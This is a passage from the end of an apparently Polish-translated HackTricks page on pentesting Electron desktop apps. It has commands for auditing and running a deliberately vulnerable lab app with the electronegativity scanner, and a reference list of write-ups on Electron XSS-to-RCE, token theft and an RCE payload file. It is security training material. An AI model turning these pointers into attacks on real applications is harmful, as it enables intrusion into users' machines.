https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Adres publikacji używany wcześniej w istniejących zakładkach: [Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Trasa całej strony przekierowuje tutaj; historyczny fragment nie jest utrzymywany.

## References

- [1] [Phishing i pozyskiwanie danych uwierzytelniających w aplikacjach Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Dowolny odczyt plików w aplikacji Facebook Messenger Desktop](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: nadużywanie braku izolacji kontekstu - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Warsztaty: hacking nowoczesnych aplikacji desktopowych za pomocą XSS i RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - wyselekcjonowana lista zasobów o (nie)bezpieczeństwie Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Nadużywanie API Electron: pierwszy wybór atakującego](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloady RCE dla nodeIntegration w Electron](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE jednym kliknięciem w aplikacjach Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Niebezpieczeństwa związane z Electron shell.openExternal() - wiele ścieżek do zdalnego wykonania kodu](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Zezwalaj na dowolne adresy URL, spodziewaj się dowolnego wykonania kodu](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Uzyskanie RCE w popularnym japońskim komunikatorze za pomocą przestarzałej funkcji Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - zdalne wykonanie kodu](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - zdalne wykonanie kodu w trybie ograniczonym (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Kradzież tokena GitHub jednym kliknięciem przez wstrzyknięcie zdarzenia klawiatury w webview VS Code](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problem VS Code #319593: webview mogą wywoływać dowolne skróty klawiaturowe w głównym obszarze roboczym](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: potwierdzanie otwierania notebooków i zaprzestanie akceptowania kontekstu installExtension podanego przez wywołującego](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: blokowanie programowego ponownego wysyłania naciśnięć klawiszy/kliknięć w webview notebooków](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / rozszerzenia lokalnego obszaru roboczego](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: jak zhakowałem wszystkie główne IDE w 2 tygodnie](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: przejmowanie popularnych aplikacji desktopowych i odkrywanie nowych obszarów ataku w Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Bezpieczeństwo Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: inżynieria wsteczna wszystkiego](https://github.com/morluto/rea)
- [24] [Odtwarzanie artefaktów JavaScript w REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Przepływy pracy aplikacji JavaScript między warstwami w REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
